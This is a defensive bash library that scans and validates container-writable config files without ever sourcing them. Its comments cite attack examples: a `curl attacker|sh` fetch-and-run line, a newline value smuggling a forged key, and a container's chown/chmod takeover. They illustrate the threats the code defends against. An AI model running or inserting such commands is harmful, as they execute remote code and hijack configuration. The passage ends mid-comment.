#!/usr/bin/env bash
# The two config files (D2/D4): ~/.mythical/mythical.conf is host-only and never mounted;
# ~/.mythical/<product>.conf is bind-mounted read-write into that product's container.
#
# <product>.conf is UNTRUSTED INPUT (D19). It is attacker-controlled after a container compromise,
# so it is NEVER sourced, eval'd or shell-expanded. Restricting what a file may MEAN does nothing
# about what happens while READING it: `KEY=$(curl attacker|sh)` executes at source time, and an
# allowlist applied to the output cannot undo that. Everything below is a pure scanner.
#
# PURE library — no side effects at source time, and no `set -euo pipefail` (that would flip the
# sourcing shell). Every function checks statuses explicitly.

MI_CONF_MAXLEN=4096
# Whole-file ceiling for the container-writable <product>.conf. SNAP_LIMIT is one byte more, so a
# bounded read that comes back full proves the original was over the ceiling. Both are consumed by
# _mi_conf_snap below; they are declared HERE rather than beside it because the ceiling is a property
# of the format, not of one reader. (They carried `shellcheck disable=SC2034` while nothing read them
# yet — removed now that _mi_conf_snap does, because a disable that suppresses nothing is a lie
# about the code.)
MI_CONF_MAXBYTES=1048576
MI_CONF_SNAP_LIMIT=1048577
MI_CONF_MARKER_PREFIX='#mythical-conf-sha256='

# --- byte-class gate -----------------------------------------------------------------------------
# Refuse a file containing ANY control byte other than the line separator (\n): NUL, CR, TAB,
# vertical tab, DEL, the lot.
#
# This MUST run on the FILE, before a single line reaches a shell variable. bash strings cannot hold
# a NUL byte, so a `grep`/`read`-based check physically cannot see one — the byte simply vanishes on
# its way into the variable and a value silently changes meaning between what was on disk and what
# was validated. `tr` and `cmp` operate on bytes, so they can.
#
# Deleting the class and comparing to the original is the portable test: identical ⇒ none present.
# Octal ranges are understood by both GNU and BSD tr. \012 (newline) is deliberately absent from the
# ranges below, so it survives; \011 (tab) is inside \000-\011 and is therefore refused.
_mi_conf_bytes_ok() {
  # shellcheck disable=SC2094   # both sides only READ $1; nothing in this pipeline writes it
  LC_ALL=C tr -d '\000-\011\013-\037\177' < "$1" 2>/dev/null | cmp -s - "$1"
}

# rc 0 iff the value contains only permitted characters.
# Permitted: printable ASCII (space included) and every byte >= 0x80, so a UTF-8 path such as
# /Users/José/work is accepted — refusing non-ASCII would break real operators and buys nothing,
# because the danger is control and shell metacharacters, not accents.
# Refused in addition: $ ` \ — inert here (nothing is ever expanded) but no legitimate value needs
# them, and their absence is what lets a reader stop worrying. Stated limitation: a path containing
# one of the three is unsupported.
#
# The control-character check is NOT redundant with the file-level byte gate. That gate protects the
# READ path; this function is also the WRITE path's validator, where the value arrives from a caller
# rather than from a file. A newline here is exactly D19's "a value containing a newline must not be
# able to forge a second key" — without this test, `mi_conf_family_add KEY $'a\nMYTHICAL_NET=evil'`
# would write two lines and the forgery would be complete.
#
# `local LC_ALL=C` forces [[:cntrl:]] to mean the ASCII control set rather than whatever the
# operator's locale defines (same technique lib/ledger.sh uses for byte collation). NUL needs no
# test: a bash variable cannot hold one.
_mi_conf_value_ok() {
  local v="$1"
  local LC_ALL=C
  [ "${#v}" -le "$MI_CONF_MAXLEN" ] || return 1
  # `*\\*` for the backslash, not `*'\'*`: both match a literal backslash, but shellcheck reads the
  # quoted form as a botched quote escape (SC1003) and CI fails on info-level findings.
  case "$v" in
    *[[:cntrl:]]*)    return 1 ;;   # newline, CR, TAB, ESC, … — the write-path forgery guard
    *'$'*|*'`'*|*\\*) return 1 ;;
    ' '*|*' ')        return 1 ;;   # unambiguous round-trip: no leading/trailing space
  esac
  return 0
}

# rc 0 iff the key is MYTHICAL_ followed by one or more of [A-Z0-9_].
# Written as "strip the prefix, then reject any character outside the class" because a bash `case`
# glob cannot express "every character matches" — `MYTHICAL_[A-Z0-9_]*` would accept MYTHICAL_A!.
_mi_conf_key_ok() {
  local k="$1" rest
  # Bracket ranges are LOCALE-COLLATED unless forced to byte order: in some locales [A-Z] matches
  # more than the 26 ASCII letters. LC_ALL=C makes the grammar mean exactly what it says.
  local LC_ALL=C
  [ "${#k}" -le 128 ] || return 1
  rest="${k#MYTHICAL_}"
  [ "$rest" != "$k" ] || return 1              # the prefix must actually have been present
  case "$rest" in ''|*[!A-Z0-9_]*) return 1 ;; esac
  return 0
}

# Emit KEY<TAB>VALUE for every assignment line read from STDIN. Comments (#) and blank lines are
# skipped. <label> only names the source in diagnostics. rc: 0 ok · 1 malformed (already reported).
#
# Stdin rather than a path so the caller can feed it a DERIVED stream — <product>.conf's body is the
# file minus its trailing marker line, and materialising that to a temp file would mean every READ
# wrote to ~/.mythical/, which breaks "reads never write" and fails outright on a read-only home.
#
# The split is `${line%%=*}` / `${line#*=}` — parameter expansion on the FIRST '=' only, so a value
# keeps any later '='. No eval, no expansion, no substitution: the value is inert data from the byte
# it is read to the byte it is emitted.
_mi_conf_scan_stream() {
  local label="$1" line key val n=0 seen=""
  while IFS= read -r line; do
    n=$((n + 1))
    case "$line" in
      # A marker line may appear ONLY as the file's last line, and the reader strips it before
      # scanning — so one reaching the body means either a second marker or a comment masquerading
      # as one. Both must be refused: treating it as an ordinary comment lets a file the published
      # contract rejects load here, and the writer would then silently delete that line.
      "$MI_CONF_MARKER_PREFIX"*)
        mi_warn "config: $label line $n: an integrity marker may only be the final line"; return 1 ;;
      ''|'#'*) continue ;;
      *'='*)   : ;;
      *) mi_warn "config: $label line $n: not a KEY=value assignment"; return 1 ;;
    esac
    key="${line%%=*}"
    val="${line#*=}"
    if ! _mi_conf_key_ok "$key"; then
      mi_warn "config: $label line $n: invalid key name"
      return 1
    fi
    if ! _mi_conf_value_ok "$val"; then
      mi_warn "config: $label line $n: value for $key contains a forbidden character or is too long"
      return 1
    fi
    # A duplicate key is ambiguous, and is exactly what a newline-forging write would produce.
    # Refuse rather than pick a winner. The delimiters make the match whole-key, so MYTHICAL_A
    # does not appear to collide with MYTHICAL_AB.
    case "$seen" in
      *"|${key}|"*) mi_warn "config: $label line $n: duplicate key $key"; return 1 ;;
    esac
    seen="${seen}|${key}|"
    printf '%s\t%s\n' "$key" "$val"
  done
  return 0
}

# File-level preconditions, then the stream scan.
# rc: 0 ok · 1 malformed (already reported) · 3 file missing.
mi_conf_scan() {
  if [ "$#" -ne 1 ]; then mi_warn "config: mi_conf_scan needs a <file>"; return 1; fi
  local f="$1"
  [ -f "$f" ] || return 3

  if ! _mi_conf_bytes_ok "$f"; then
    mi_warn "config: $f contains control bytes (NUL, CR, TAB or similar) — refusing to parse it"
    return 1
  fi
  # A file that does not end in a newline was truncated mid-write. Empty is fine.
  if [ -s "$f" ] && [ -n "$(tail -c1 "$f" 2>/dev/null)" ]; then
    mi_warn "config: $f does not end in a newline (truncated?) — refusing to parse it"
    return 1
  fi

  # shellcheck disable=SC2094   # "$f" here is only a LABEL for diagnostics; the redirect is the read
  _mi_conf_scan_stream "$f" < "$f"
}

# --- typed validation (D19) ----------------------------------------------------------------------
# A SPEC is a newline-separated list of KEY<TAB>TYPE records. It is a PARAMETER, not a constant,
# because <product>.conf's allowlist comes from that product's manifest (Plan 3) while
# mythical.conf's is core-owned. One engine, several vocabularies.

# Decimal-string range check without shell integer conversion, so a 30-digit value cannot overflow
# `[ -ge ]` and wrap into range.
#
# NON-NEGATIVE ONLY, and the interface says so: no sign, no leading `+`, no surrounding space. Every
# setting this format expresses (retention days, ports, counts) is non-negative, and a signed
# comparison that also has to be overflow-safe is more machinery than any caller needs. A spec
# writing `int:-10:10` is a spec bug, not a value that should validate.
_mi_conf_int_ok() {
  local v="$1" min="$2" max="$3"
  case "$v" in ''|*[!0-9]*) return 1 ;; esac       # all digits, non-empty: no sign, no space, no +
  # A leading zero would be re-read as OCTAL by the `[ -ge ]` below: `010` passes an int:1:100 check
  # having compared as 8, and `0100` passes it having compared as 64 — a value textually out of range
  # validating because the shell read a different number than the file spells. `0` itself is fine.
  case "$v" in 0[0-9]*) return 1 ;; esac
  [ "${#v}" -le 18 ] || return 1                   # beyond this, shell arithmetic is not reliable
  [ "$v" -ge "$min" ] && [ "$v" -le "$max" ]
}

# Validate one value against one type. rc 0 ok, 1 reject.
_mi_conf_type_ok() {
  local type="$1" v="$2" p
  case "$type" in
    str:*)
      p="${type#str:}"
      [ "${#v}" -le "$p" ]
      ;;
    int:*:*)
      p="${type#int:}"
      _mi_conf_int_ok "$v" "${p%%:*}" "${p#*:}"
      ;;
    bool)
      case "$v" in true|false) return 0 ;; *) return 1 ;; esac
      ;;
    enum:*)
      # Delimit both sides so `re` does not match inside `red`, and an empty value does not match
      # the empty string between two pipes.
      [ -n "$v" ] || return 1
      # Reject the DELIMITER itself before matching. Quoting `"|${v}|"` makes the expansion literal,
      # so glob metacharacters in the value are inert — but a value that CONTAINS `|` forges a match
      # against the joined list rather than a member of it: for enum:red|green, v='red|green' turns
      # the pattern into *"|red|green|"*, which the subject "|red|green|" matches exactly. The format
      # has no escaping, so no enum member can legitimately contain `|`.
      case "$v" in *'|'*) return 1 ;; esac
      case "|${type#enum:}|" in *"|${v}|"*) return 0 ;; *) return 1 ;; esac
      ;;
    path:*)
      p="${type#path:}"
      [ -n "$v" ] || return 1
      case "$v" in /*) : ;; *) return 1 ;; esac
      [ "${#v}" -le "$p" ] || return 1
      # Reject a `..` PATH COMPONENT, not the substring: /srv/..hidden is a legitimate name.
      case "/${v}/" in */../*) return 1 ;; esac
      return 0
      ;;
    netname)
      # Docker network name: [A-Za-z0-9] then [A-Za-z0-9_.-]*. Additionally refuse the two special
      # modes §4b.2 bans from mythical.conf — `host` shares the host network namespace outright, and
      # `container:<name>` joins another container's. Neither is a network this installer may own.
      # An `if`, not `A && B || C`: shellcheck 0.11 does not flag that construct but the version CI
      # installs does (SC2015), and this repository already shipped three red commits on exactly
      # this pattern (828a199). The logic happens to be right either way — C runs when B fails,
      # which is what we want — but the line does not say so, and an `if` does.
      if [ -z "$v" ] || [ "${#v}" -gt 128 ]; then return 1; fi
      case "$v" in
        host|none|container:*) return 1 ;;
      esac
      case "$v" in [A-Za-z0-9]*) : ;; *) return 1 ;; esac
      case "${v#?}" in *[!A-Za-z0-9_.-]*) return 1 ;; esac
      return 0
      ;;
    *)
      mi_warn "config: internal error — unknown spec type '$type'"
      return 1
      ;;
  esac
}

# Look up a key's type in the spec. Prints the type, rc 1 if the key is not in the spec.
_mi_conf_spec_type() {
  local spec="$1" key="$2" line
  while IFS= read -r line; do
    case "$line" in
      "$key"$'\t'*) printf '%s\n' "${line#*$'\t'}"; return 0 ;;
    esac
  done <<< "$spec"
  return 1
}

# Validate already-scanned KEY<TAB>VALUE records (in $1) against a spec. <label> names the source in
# diagnostics. rc: 0 ok · 1 rejected (reported).
# An UNKNOWN key is a rejection, never a skip (D19): ignoring it would let a compromised container
# accumulate keys that a later, wider spec silently activates.
# Records are passed as an ARGUMENT, not on stdin, because a `| while` runs the loop in a subshell
# where `rc=1` is lost — the classic way a validator reports success while having rejected something.
#
# Output is BUFFERED and emitted only if every record validates. Printing as it goes would hand a
# consumer a PREFIX of attacker-influenced configuration whenever a later record is rejected — the
# file "fails" but its first few keys were already on stdout. A caller that pipes this, or that gets
# its status handling wrong, would act on them. Nothing escapes a rejected file.
_mi_conf_validate() {
  local records="$1" label="$2" spec="$3" rc=0 line key val type out=""
  [ -n "$records" ] || return 0
  while IFS= read -r line; do
    key="${line%%$'\t'*}"
    val="${line#*$'\t'}"
    if ! type="$(_mi_conf_spec_type "$spec" "$key")"; then
      mi_warn "config: $label: unknown key $key — not permitted by this configuration schema"
      rc=1
      continue
    fi
    if ! _mi_conf_type_ok "$type" "$val"; then
      mi_warn "config: $label: value for $key is not valid for type $type"
      rc=1
      continue
    fi
    out="${out}${key}"$'\t'"${val}"$'\n'
  done <<< "$records"
  if [ "$rc" -ne 0 ]; then return "$rc"; fi
  # `if`, not `[ -n "$out" ] && printf ...` — as the last command that would return 1 on an empty
  # (legitimately keyless) config, turning a valid file into a rejection.
  if [ -n "$out" ]; then printf '%s' "$out"; fi
  return 0
}

# Parse a file and validate every record against the spec.
# rc: 0 ok · 1 rejected (reported) · 3 file missing.
mi_conf_load() {
  if [ "$#" -ne 2 ]; then mi_warn "config: mi_conf_load needs a <file> and a <spec>"; return 1; fi
  local f="$1" spec="$2" records
  records="$(mi_conf_scan "$f")" || return $?
  _mi_conf_validate "$records" "$f" "$spec"
}

# Print one raw (scanned, not spec-validated) value. rc: 0 ok · 1 parse failure · 3 absent.
#
# For MARKER-LESS files — mythical.conf, or a body already separated from its marker. A
# <product>.conf still carrying its trailing marker is REJECTED here, by design: the scanner refuses
# marker lines outright, and the way to read a product config is mi_conf_product_load, which strips
# and validates the marker first. Reading one through this function would skip the integrity gate.
_mi_conf_record_value() {
  local records="$1" key="$2" line
  while IFS= read -r line; do
    case "$line" in "$key"$'\t'*) printf '%s\n' "${line#*$'\t'}"; return 0 ;; esac
  done <<< "$records"
  return 3
}

# Used where the caller wants a single key without a full spec — e.g. reading back a value this
# process wrote. Propagates a parse failure rather than reporting the key absent: "the file is
# hostile" and "the key is not set" must never look the same to a caller deciding whether to write.
mi_conf_get() {
  if [ "$#" -ne 2 ]; then mi_warn "config: mi_conf_get needs a <file> and a <key>"; return 1; fi
  local f="$1" key="$2" records line
  records="$(mi_conf_scan "$f")" || return $?
  while IFS= read -r line; do
    case "$line" in
      "$key"$'\t'*) printf '%s\n' "${line#*$'\t'}"; return 0 ;;
    esac
  done <<< "$records"
  return 3
}

# --- mythical.conf — host-only, never mounted (D2/D4) ---------------------------------------------

mi_conf_family_path() { printf '%s/mythical.conf\n' "$(mi_home)"; }

# The CORE spec: keys that are product-independent. Product-scoped keys (MYTHICAL_<PRODUCT>_PORT,
# MYTHICAL_<PRODUCT>_WORK_BIND) are declared by that product's manifest and merged in by Plan 3 —
# this plan owns the engine and the core vocabulary, not the product vocabularies.
mi_conf_family_spec() {
  printf 'MYTHICAL_NET\tnetname\n'
  printf 'MYTHICAL_TELEMETRY_KEY\tstr:512\n'
}

mi_conf_family_load() {
  mi_conf_load "$(mi_conf_family_path)" "$(mi_conf_family_spec)"
}

# Has the live file changed since it was digested? This is the ONLY sanctioned read of the live file
# besides _mi_conf_snap, and it is safe for a reason worth stating: it compares a digest and never
# derives configuration from what it reads, so it cannot become an injection path. It is a NAMED
# function precisely so the structural test can permit exactly this one exception and nothing else —
# an inline `mi_digest "$f"` in a writer would be indistinguishable from a regression.
#
# Defined HERE, in Task 3, because mi_conf_family_add below is its first caller. (`_mi_conf_snap` and
# the structural test named above arrive in Task 4; this comment describes the end state.)
_mi_conf_unchanged() {
  local f="$1" pre="$2" now=""
  if [ -f "$f" ]; then now="$(mi_digest "$f")" || now="?"; fi
  [ "$now" = "$pre" ]
}

# ADD one key, preserving the rest of the file byte-for-byte (D9).
#
# ADDITIVE ONLY. Absent ⇒ written; already present with the SAME value ⇒ no-op success; present with
# a DIFFERENT value ⇒ REFUSED. §10a requires a re-install to leave user-owned files byte-identical
# "including an operator's hand edit", and a second product's install to make mythical.conf "gain
# keys additively" — a primitive that blind-writes cannot satisfy either, because the installer
# cannot tell its own earlier value from something the operator typed. Changing an existing value is
# a compare-and-set, which §5.2's migration paths define and Plan 4 builds; not available here.
#
# Atomic replace is correct HERE and only here: mythical.conf is never bind-mounted (§4.1a), so
# swapping the inode detaches nothing. <product>.conf must NOT be written this way — see
# mi_conf_product_add.
mi_conf_family_add() {
  # Arity BEFORE any positional expansion: under the entrypoint's `set -u`, `local val="$2"` on a
  # one-argument call aborts the CLI with "unbound variable" instead of refusing in our own words.
  if [ "$#" -ne 2 ]; then
    mi_warn "config: mi_conf_family_add needs exactly a KEY and a VALUE"; return 1
  fi
  local key="$1" val="$2" f dir tmp type existing rc
  mi_lock_assert_held "write mythical.conf"
  f="$(mi_conf_family_path)"; dir="$(dirname "$f")"

  # Validate the key and value BEFORE touching the file. A newline in a value would forge a second
  # key on the next read — the D19 "serialize safely on write" requirement — and _mi_conf_value_ok
  # rejects it along with every other control byte.
  if ! _mi_conf_key_ok "$key"; then
    mi_warn "config: refusing to write invalid key name '$key'"; return 1
  fi
  if ! type="$(_mi_conf_spec_type "$(mi_conf_family_spec)" "$key")"; then
    mi_warn "config: $key is not a key mythical.conf accepts"; return 1
  fi
  if ! _mi_conf_value_ok "$val" || ! _mi_conf_type_ok "$type" "$val"; then
    mi_warn "config: refusing to write an invalid value for $key"; return 1
  fi

  # Never overwrite a file we cannot read. A config that does not parse may be an operator's
  # half-finished edit or a hostile write; either way, silently rewriting it destroys evidence and
  # could discard settings. Refuse and report. (An absent file is fine — that is a first write.)
  # Gate on the FULL load, not merely on the syntax scan. A file holding a key outside the core
  # schema scans perfectly and fails mi_conf_family_load — so gating on the scan alone would let this
  # function "succeed" while producing a file its own reader rejects. Whatever we refuse to read, we
  # refuse to modify.
  if [ -f "$f" ] && ! mi_conf_family_load >/dev/null 2>&1; then
    mi_warn "config: $f does not load cleanly — refusing to modify it; fix or remove it first"
    return 1
  fi

  # The additive gate. mi_conf_get distinguishes absent (3) from a parse failure (1), which is why it
  # exists — "the key is not set" and "the file is hostile" must never look the same to code deciding
  # whether to write.
  if [ -f "$f" ]; then
    if existing="$(mi_conf_get "$f" "$key")"; then rc=0; else rc=$?; fi
    if [ "$rc" -eq 0 ]; then
      if [ "$existing" = "$val" ]; then
        return 0                       # already exactly what we would write: nothing to do
      fi
      mi_warn "config: $key is already set to '$existing' in $f — refusing to overwrite it"
      mi_warn "  An operator's value is never replaced silently; change it by hand, or remove the line."
      return 1
    fi
    [ "$rc" -eq 3 ] || return "$rc"    # absent is the only status that authorizes a write
  fi

  tmp="$(mktemp "$dir/.mythical.conf.XXXXXX")" || { mi_warn "config: cannot create a temp file in $dir"; return 1; }
  # 0600 BEFORE any content lands: mktemp is already 0600, but making it explicit means a future
  # change to the temp mechanism cannot silently widen a file that holds bootstrap secrets.
  chmod 600 "$tmp" || { rm -f "$tmp"; mi_warn "config: cannot set mode on $tmp"; return 1; }

  # The key is known ABSENT (the gate above proved it), so this is a pure byte copy plus an append —
  # every existing byte, comment, blank line and ordering survives unchanged, which is the D9
  # guarantee stated as code rather than as a loop that could get it subtly wrong.
  local pre=""
  if [ -f "$f" ]; then
    pre="$(mi_digest "$f")" || { rm -f "$tmp"; mi_warn "config: cannot read $f"; return 1; }
    cat "$f" > "$tmp" || { rm -f "$tmp"; mi_warn "config: cannot read $f"; return 1; }
  fi
  printf '%s=%s\n' "$key" "$val" >> "$tmp"

  # Compare-and-swap on the WHOLE FILE before replacing it. The family lock serializes every other
  # mythical-ctl process, but not the two writers D9 explicitly expects: the operator in an editor,
  # and (for <product>.conf) the product's own UI. Without this, a save landing between the read
  # above and the rename below is silently discarded — §5.2's "the edit is lost" residual, which
  # the design permits only when the command REPORTS it immediately. Refusing is better than
  # reporting after the fact, and costs one extra read. It narrows the window rather than closing
  # it; residual 11 states what is left.
  if ! _mi_conf_unchanged "$f" "$pre"; then
    rm -f "$tmp"
    mi_warn "config: $f changed while we were reading it — refusing to overwrite that change; re-run"
    return 1
  fi

  # Atomic replace within the same directory, so rename() cannot cross filesystems.
  mv -f "$tmp" "$f" || { rm -f "$tmp"; mi_warn "config: cannot replace $f"; return 1; }
  return 0
}

# --- <product>.conf — bind-mounted, container-writable (D2/D19/D60) --------------------------------

# A product name becomes a PATHNAME, so it is validated before it becomes one.
#
# Unchecked, `mi_conf_product_path mythical` resolves to ~/.mythical/mythical.conf — the host-only
# file D2's entire split depends on being unreachable from the product side — and `../outside` or
# `bin/x` leave the flat namespace altogether. The §4.1a identity checks cannot save us here: they
# ask "is this file its own file", not "is this the file we meant".
#
# Grammar: lowercase letter, then lowercase letters, digits and hyphens; at most 64 characters. That
# is the shape of every product name in the family, and it contains no path separator, no dot, and
# no way to spell `..`.
_mi_conf_product_name_ok() {
  local p="$1"
  local LC_ALL=C            # byte order, not locale collation — see _mi_conf_key_ok
  # An `if`, not `A && B || C` — SC2015, which local shellcheck misses and CI flags. See the identical
  # note on `netname` in Task 2.
  if [ -z "$p" ] || [ "${#p}" -gt 64 ]; then return 1; fi
  case "$p" in
    mythical) return 1 ;;      # RESERVED: would collide with the host-only mythical.conf
    [a-z]*)   : ;;
    *)        return 1 ;;
  esac
  case "${p#?}" in *[!a-z0-9-]*) return 1 ;; esac
  return 0
}

# `_mi_conf_unchanged` is NOT defined here — it is defined in **Task 3**, which is its first caller
# (mi_conf_family_add's compare-and-swap gate) and which ships first. Defining it in this task, as an
# earlier draft of this plan did, left Task 3 calling a function that did not exist yet: the call
# resolved to "command not found" (127), `if ! _mi_conf_unchanged …` was therefore TRUE, and the
# "changed while we were reading it" branch fired on every single write — failing most of Task 3's
# suite for a reason nothing in Task 3 explained.
#
# There is deliberately NO mi_family_gid() in this module. D60 fixes the canonical family gid "in
# the policy index", so the only honest source is authenticated policy — which Plan 3 builds. A
# default here would be a SECOND authority for the same value, and the one that ships first wins by
# accident. The gid is therefore a PARAMETER of mi_conf_product_add, supplied by a caller that has
# already authenticated the policy index (Plan 3's mi_policy_family_gid reads it; Plan 4 wires it).
#
# There is also no MI_FAMILY_GID environment variable: an earlier draft read `${MI_FAMILY_GID:-…}`
# "for tests", which would have shipped `MI_FAMILY_GID=0 mythical-ctl …` as a supported way to write
# a root-group 0660 config file.

mi_conf_product_path() {
  if [ "$#" -ne 1 ] || ! _mi_conf_product_name_ok "$1"; then
    mi_warn "config: '${1:-}' is not a valid product name (lowercase letters, digits and hyphens; 'mythical' is reserved)"
    return 1
  fi
  printf '%s/%s.conf\n' "$(mi_home)" "$1"
}

# Refuse a config file whose identity is not its own (§4.1a). rc 0 ok, 1 refused (reported).
#
# The symlink check alone is NOT sufficient: a hardlink is a second name for the same inode, not a
# link at the path level, so every symlink test passes it. brokkr.conf hardlinked to mythical.conf
# turns a product write into a write to the host-only file; hardlinked to bin/mythical-ctl it
# rewrites the CLI. Link count > 1 on a file this installer created is unexplainable, not merely
# suspicious — so refuse outright rather than trying to identify the other name.
_mi_conf_identity_ok() {
  local f="$1" links owner me
  if [ -L "$f" ]; then
    mi_warn "config: $f is a symlink — refusing (a config file must be its own file)"
    return 1
  fi
  [ -e "$f" ] || return 0                     # absent is fine; a first write creates it
  if [ ! -f "$f" ]; then
    mi_warn "config: $f is not a regular file — refusing"
    return 1
  fi
  # `ls -ld` is the portable link count: `stat` format strings differ between GNU and BSD, and
  # `find -printf` is GNU-only. Field 2 of the long listing is the link count on both.
  # shellcheck disable=SC2012   # parsing ls is deliberate here; find has no portable link-count output
  links="$(ls -ld "$f" | awk 'NR==1{print $2}')"
  case "$links" in ''|*[!0-9]*) mi_warn "config: cannot read the link count of $f — refusing"; return 1 ;; esac
  if [ "$links" -gt 1 ]; then
    mi_warn "config: $f has $links names (hardlinked) — refusing; this installer created it and nothing legitimate shares its inode"
    return 1
  fi

  # OWNERSHIP. This closes a gap the plan did not ask for: §4.5/D60 fixes owner=operator, and
  # mi_conf_product_add's own comment ASSERTS it ("owner=operator, 0660, group = …") while nothing
  # verified it. The check makes the assertion true.
  #
  # The failure it closes is concrete. On a rootful container runtime with no userid remapping, a
  # compromised container does `chown 0:0 <product>.conf; chmod 0666`. Every check above still passes
  # — it is a regular file, with one name, and not a symlink — so the host reads it, accepts it, and
  # the content write SUCCEEDS because the file is world-writable. Only the chgrp and chmod
  # afterwards fail (EPERM: we are not the owner), so the function returns a generic refusal having
  # already rewritten a file it does not own, and leaves it root-owned and world-writable for any
  # local user to steer that product's settings with.
  #
  # `ls -ldn` prints the NUMERIC uid in field 3 on both GNU and BSD — verified on GNU coreutils 9.7
  # and macOS /bin/ls, including with the `@`/`+` mode suffixes BSD appends, which stay inside field
  # 1 and shift nothing. A `stat` format string is not portable and `find -printf` is GNU-only.
  # shellcheck disable=SC2012   # parsing ls is deliberate here; see the link-count note above
  owner="$(ls -ldn "$f" | awk 'NR==1{print $3}')"
  me="$(id -u)"
  # Guarded exactly like the link count: an unreadable identity is a refusal, never an assumption
  # that the file is ours.
  case "$owner" in ''|*[!0-9]*) mi_warn "config: cannot read the owner of $f — refusing"; return 1 ;; esac
  case "$me"    in ''|*[!0-9]*) mi_warn "config: cannot read our own uid — refusing to trust $f"; return 1 ;; esac
  if [ "$owner" != "$me" ]; then
    mi_warn "config: $f is owned by uid $owner, not by you (uid $me) — refusing; this installer created it and nothing legitimate takes it over"
    return 1
  fi
  return 0
}

# rc 0 iff the file's LAST line is a marker line (whether or not it matches).
_mi_conf_last_is_marker() {
  local last
  last="$(tail -n1 "$1" 2>/dev/null)" || return 1
  case "$last" in "$MI_CONF_MARKER_PREFIX"*) return 0 ;; *) return 1 ;; esac
}

# rc 0 iff the trailing marker is present and matches the body above it.
_mi_conf_marker_ok() {
  local f="$1" last expected actual raw
  _mi_conf_last_is_marker "$f" || return 1
  last="$(tail -n1 "$f" 2>/dev/null)" || return 1
  expected="${last#"$MI_CONF_MARKER_PREFIX"}"
  # `sed | mi_digest` would return the DIGEST's status, not sed's — these libraries deliberately do
  # not set pipefail (it would flip the sourcing shell). A sed that emitted a prefix and then died
  # would be hashed as if it were the whole body, and the file's own author chooses the marker, so
  # they could publish the prefix's digest and have it verify. Capture with a sentinel so the status
  # is sed's own and the trailing newlines survive.
  if ! raw="$(sed '$d' "$f" && printf X)"; then return 1; fi
  raw="${raw%X}"
  actual="$(printf '%s' "$raw" | mi_digest /dev/stdin)" || return 1
  [ -n "$actual" ] && [ "$actual" = "$expected" ]
}

# Copy a config to a PRIVATE inode and print the snapshot's path. rc 1 on failure.
#
# The buffer goes in TMPDIR, not ~/.mythical/: a read must not write into the family home (it would
# show up in the D9 filesystem snapshots and would fail outright on a read-only home). No rename is
# involved, so there is no same-filesystem requirement to keep it local.
# The copy is BOUNDED. <product>.conf is bind-mounted read-write into a container, so its size is
# attacker-controlled: an unbounded `cat` would expand it into real TMPDIR storage, and the writer
# would then build the whole body in a bash variable. The per-value 4096-byte cap does not help —
# it bounds one value, not the count of them, the comments, or the file.
#
# `head -c` bounds the COPY rather than checking the size first, which would be its own TOCTOU (the
# container can grow the file between the check and the read). Reading LIMIT bytes and finding the
# buffer full means the original was at least LIMIT, so it is refused without ever holding it.
# 1 MiB is far beyond any legitimate config: at the 4096-byte value cap that is hundreds of settings.
_mi_conf_snap() {
  local f="$1" snap sz
  snap="$(mktemp "${TMPDIR:-/tmp}/mctl-conf.XXXXXX")" || { mi_warn "config: cannot create a read buffer"; return 1; }
  if ! head -c "$MI_CONF_SNAP_LIMIT" "$f" > "$snap" 2>/dev/null; then
    rm -f "$snap"; mi_warn "config: cannot read $f"; return 1
  fi
  sz="$(wc -c < "$snap" 2>/dev/null | tr -d ' ')"
  case "$sz" in ''|*[!0-9]*) rm -f "$snap"; mi_warn "config: cannot size $f"; return 1 ;; esac
  if [ "$sz" -ge "$MI_CONF_SNAP_LIMIT" ]; then
    rm -f "$snap"
    mi_warn "config: $f is larger than ${MI_CONF_MAXBYTES} bytes — refusing to read it"
    return 1
  fi
  printf '%s\n' "$snap"
}

# Validate an already-taken snapshot and emit its validated records.
# <snap> is the private copy; <label> names the real file in diagnostics. rc: 0 · 1 rejected · 4 torn.
#
# Shared by the reader and the writer so that BOTH work from bytes they own. The writer used to
# validate a snapshot and then rebuild the body by re-opening the live file — a container could
# swap the file in that gap and the host would hash and re-bless whatever it found, with a
# perfectly valid marker. That is a CONTENT race, distinct from residual 8's pathname race, and
# unlike that one it is closable: read the bytes once and never look at the file again.
_mi_conf_snap_load() {
  local snap="$1" label="$2" spec="$3" records rc
  # Control bytes first: binary or CR-laden content is hostile input, not a torn write.
  if ! _mi_conf_bytes_ok "$snap"; then
    mi_warn "config: $label contains control bytes — refusing to parse it"; return 1
  fi
  # A file not ending in a newline was cut mid-line: torn, like a bad marker.
  if [ -s "$snap" ] && [ -n "$(tail -c1 "$snap" 2>/dev/null)" ]; then
    mi_warn "config: $label does not end in a newline — the last write was interrupted; using defaults"
    return 4
  fi
  if ! _mi_conf_marker_ok "$snap"; then
    mi_warn "config: $label does not match its integrity marker — using defaults."
    mi_warn "  If you edited it by hand, recompute the marker (see docs/CONFIG-FORMAT.md);"
    mi_warn "  if you did not, the last write was interrupted and the file is truncated."
    return 4
  fi
  # `if records=...; then rc=0; else rc=$?; fi`, NOT `records=...; rc=$?`. An assignment whose
  # command substitution fails carries that failure as the assignment's own status, so under the
  # entrypoint's `set -e` the bare form terminates the CLI at the assignment and the rc handling
  # below is never reached — the caller sees an abrupt exit instead of a contract return code.
  # Same sentinel capture as _mi_conf_marker_ok, and for the same reason: piping sed into the
  # scanner would report the SCANNER's status, so a truncated read would be validated as a complete
  # — and shorter — configuration. Take sed's status first, then scan the bytes we actually hold.
  local raw
  if ! raw="$(sed '$d' "$snap" && printf X)"; then
    mi_warn "config: cannot read the body of $label"; return 1
  fi
  raw="${raw%X}"
  if records="$(printf '%s' "$raw" | _mi_conf_scan_stream "$label")"; then rc=0; else rc=$?; fi
  [ "$rc" -eq 0 ] || return "$rc"
  _mi_conf_validate "$records" "$label" "$spec"
}

# Read a product's config. rc: 0 ok · 1 rejected by the spec or identity · 3 absent · 4 TORN.
#
# The marker DETECTS TEARING; it does not authenticate content — the container writes both the body
# and the marker, so an attacker controlling one controls the other. The parser is the security
# control (D19); the marker is a crash detector.
#
# The marker gate comes FIRST and is STRICT (Decisions item 3, settled by the maintainer 2026-07-28):
#   marker matches, body parses   → accept silently
#   marker ABSENT or MISMATCHED   → TORN: rc 4, the caller uses defaults, and the report names BOTH
#                                   causes — a hand edit whose marker needs recomputing, and a write
#                                   that was interrupted — because the operator cannot tell them
#                                   apart from the file alone
#   marker matches, body broken   → rejected as MALFORMED (rc 1), not torn: the bytes are intact,
#                                   they are simply not valid config. Telling an operator to repair a
#                                   file that is byte-for-byte what was written sends them after the
#                                   wrong problem.
#
# The strictness is the whole point, and the softer reading was considered and REJECTED: an in-place
